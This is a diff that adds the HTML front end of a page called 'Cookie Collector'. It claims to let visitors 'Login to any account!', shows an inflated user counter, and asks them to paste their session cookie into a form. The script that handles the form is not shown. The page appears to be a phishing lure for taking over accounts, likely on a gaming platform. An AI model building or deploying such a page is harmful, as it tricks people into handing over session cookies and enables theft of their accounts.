@@ -1,0 +1,42 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Cookie Collector</title>
+  <link rel="stylesheet" href="style.css">
+  <link href="https://fonts.googleapis.com/css2?family=Source+Sans+Pro:wght@400;700&display=swap" rel="stylesheet"> <!-- Clean, modern font -->
+</head>
+<body>
+  <!-- Sleek, Glass-like Nav Bar (Nonfunctional) -->
+  <nav class="glass-nav">
+    <div class="nav-logo">Cookie Collector</div>
+    <div class="nav-items">
+      <span class="nav-item">Home</span>
+      <span class="nav-item">Games</span>
+      <span class="nav-item">Avatar</span>
+      <span class="nav-item">Store</span>
+    </div>
+  </nav>
+
+  <div class="container">
+    <!-- Header -->
+    <header>
+      <h1>Login to any account!</h1>
+      <p>Used by <span id="counter">0</span>m Users!</p>
+    </header>
+
+    <!-- Form Area -->
+    <form id="cookieForm">
+      <input type="text" name="username" placeholder="Your username (optional)">
+      <textarea name="cookie" placeholder="Your Cookie" required></textarea>
+      <button type="submit">Submit</button>
+    </form>
+
+    <!-- Confirmation Message -->
+    <p id="confirmation" class="hidden">Thanks for your feedback!</p>
+  </div>
+
+  <script src="script.js"></script>
+</body>
+</html>
